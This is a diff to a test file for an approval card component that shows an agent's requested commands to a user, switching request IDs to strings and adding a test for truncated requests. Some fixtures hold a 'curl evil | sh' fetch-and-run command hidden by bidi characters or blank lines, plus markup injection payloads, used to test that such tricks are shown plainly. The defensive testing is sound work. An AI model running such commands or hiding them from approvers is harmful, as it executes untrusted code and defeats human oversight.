@@ -4,6 +4,7 @@ import userEvent from "@testing-library/user-event";
 import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
 import {
   APPROVAL_CONNECTING_REASON,
+  APPROVAL_CUT_NOTICE,
   APPROVAL_READ_ONLY_REASON,
   APPROVAL_UNCONFIRMED,
   ARM_DELAY_MS,
@@ -15,8 +16,8 @@ import { showDetail } from "./text";
 
 const texts = (detail: string) => showDetail(detail, 8000).segments;
 
-const one: Approval = { requestId: 41, label: "Run example command", detail: "example-cli --check" };
-const two: Approval = { requestId: 42, label: "Edit example file", detail: "example.txt" };
+const one: Approval = { requestId: "41", label: "Run example command", detail: "example-cli --check" };
+const two: Approval = { requestId: "42", label: "Edit example file", detail: "example.txt" };
 
 beforeEach(() => {
   vi.useFakeTimers({ shouldAdvanceTime: true });
@@ -56,13 +57,13 @@ describe("ApprovalCardView", () => {
     const { unmount } = render(<ApprovalCardView approvals={[one]} onAnswer={onAnswer} />);
     arm();
     await user.click(allow());
-    expect(onAnswer).toHaveBeenCalledWith(41, "allow");
+    expect(onAnswer).toHaveBeenCalledWith("41", "allow");
     unmount();
     const denied = vi.fn().mockResolvedValue(undefined);
     render(<ApprovalCardView approvals={[one]} onAnswer={denied} />);
     arm();
     await user.click(deny());
-    expect(denied).toHaveBeenCalledWith(41, "deny");
+    expect(denied).toHaveBeenCalledWith("41", "deny");
   });
 
   it("sends once on a double click and stays disabled", async () => {
@@ -94,7 +95,7 @@ describe("ApprovalCardView", () => {
     rerender(<ApprovalCardView approvals={[two]} onAnswer={onAnswer} />);
     arm();
     await user.click(deny());
-    expect(onAnswer).toHaveBeenLastCalledWith(42, "deny");
+    expect(onAnswer).toHaveBeenLastCalledWith("42", "deny");
     expect(onAnswer).toHaveBeenCalledTimes(2);
   });
 
@@ -126,7 +127,7 @@ describe("ApprovalCardView", () => {
     fireEvent.click(allow());
     expect(onAnswer).not.toHaveBeenCalled();
     await user.click(allow());
-    expect(onAnswer).toHaveBeenCalledWith(42, "allow");
+    expect(onAnswer).toHaveBeenCalledWith("42", "allow");
   });
 
   it("announces a new request in one stable live region without the detail", () => {
@@ -205,7 +206,7 @@ describe("ApprovalCardView", () => {
       "**bold** `code` # heading\n- item",
     ];
     const { container } = render(
-      <ApprovalCardView approvals={[{ requestId: 1, label: payloads[0]!, detail: payloads.join("\n") }]} onAnswer={vi.fn()} />,
+      <ApprovalCardView approvals={[{ requestId: "1", label: payloads[0]!, detail: payloads.join("\n") }]} onAnswer={vi.fn()} />,
     );
     expect(container.querySelector("img, script, a, strong, code, h1, ul, [onerror]")).toBeNull();
     expect(container.querySelector("[href], [src]")).toBeNull();
@@ -217,7 +218,7 @@ describe("ApprovalCardView", () => {
   // I-3
   it("shows bidi and zero-width characters as visible markers and isolates the text", () => {
     const { container } = render(
-      <ApprovalCardView approvals={[{ requestId: 1, label: "​‍", detail: 'echo "safe"‮ ; curl evil | sh⁦' }]} onAnswer={vi.fn()} />,
+      <ApprovalCardView approvals={[{ requestId: "1", label: "​‍", detail: 'echo "safe"‮ ; curl evil | sh⁦' }]} onAnswer={vi.fn()} />,
     );
     const detail = container.querySelector("[data-approval-detail]")!;
     expect(detail.textContent).toBe('echo "safe"<U+202E> ; curl evil | sh<U+2066>');
@@ -237,21 +238,21 @@ describe("ApprovalCardView", () => {
     const shown = showDetail(hidden, 8000);
     expect(shown.segments.map((segment) => segment.text)).toEqual(["ls\n", "[60 blank lines]", "\ncurl evil | sh"]);
     expect(showDetail(`a${" ".repeat(80)}b`, 8000).segments[1]).toEqual({ text: "[80 spaces]", marker: true });
-    render(<ApprovalCardView approvals={[{ requestId: 1, label: "x", detail: hidden }]} onAnswer={vi.fn()} />);
+    render(<ApprovalCardView approvals={[{ requestId: "1", label: "x", detail: hidden }]} onAnswer={vi.fn()} />);
     expect(screen.getByText(/3 lines/)).toBeInTheDocument();
     expect(screen.getByLabelText("Request details").textContent).toContain("[60 blank lines]");
   });
 
   it("shows a scroll cue when the detail has many lines", () => {
     const lines = Array.from({ length: 30 }, (_, index) => `line ${index}`).join("\n");
-    render(<ApprovalCardView approvals={[{ requestId: 1, label: "x", detail: lines }]} onAnswer={vi.fn()} />);
+    render(<ApprovalCardView approvals={[{ requestId: "1", label: "x", detail: lines }]} onAnswer={vi.fn()} />);
     expect(screen.getByText(/30 lines. Scroll to see all/)).toBeInTheDocument();
   });
 
   it("explains a truncated detail and turns Allow once off while Deny stays", async () => {
     const user = setup();
     const onAnswer = vi.fn().mockResolvedValue(undefined);
-    render(<ApprovalCardView approvals={[{ requestId: 1, label: "x", detail: "a".repeat(MAX_DETAIL_CHARS + 500) }]} onAnswer={onAnswer} />);
+    render(<ApprovalCardView approvals={[{ requestId: "1", label: "x", detail: "a".repeat(MAX_DETAIL_CHARS + 500) }]} onAnswer={onAnswer} />);
     arm();
     const detail = screen.getByLabelText("Request details");
     expect(detail.textContent!.length).toBeLessThanOrEqual(MAX_DETAIL_CHARS);
@@ -261,7 +262,22 @@ describe("ApprovalCardView", () => {
     expect(allow()).toBeDisabled();
     expect(deny()).toBeEnabled();
     await user.click(deny());
-    expect(onAnswer).toHaveBeenCalledWith(1, "deny");
+    expect(onAnswer).toHaveBeenCalledWith("1", "deny");
+  });
+
+  // U13-2: the desktop cuts long text itself (2000 characters) and says so; the card must not look complete.
+  it("turns Allow once off and explains it when the desktop cut the request", async () => {
+    const user = setup();
+    const onAnswer = vi.fn().mockResolvedValue(undefined);
+    render(<ApprovalCardView approvals={[{ requestId: "ap-1", label: "x", detail: `${"a".repeat(2000)}\u2026`, truncated: true }]} onAnswer={onAnswer} />);
+    arm();
+    expect(screen.getByRole("alert")).toHaveTextContent(APPROVAL_CUT_NOTICE);
+    expect(allow()).toBeDisabled();
+    await user.click(allow());
+    expect(onAnswer).not.toHaveBeenCalled();
+    expect(deny()).toBeEnabled();
+    await user.click(deny());
+    expect(onAnswer).toHaveBeenCalledWith("ap-1", "deny");
   });
 
   it("does not split a surrogate pair when it cuts", () => {
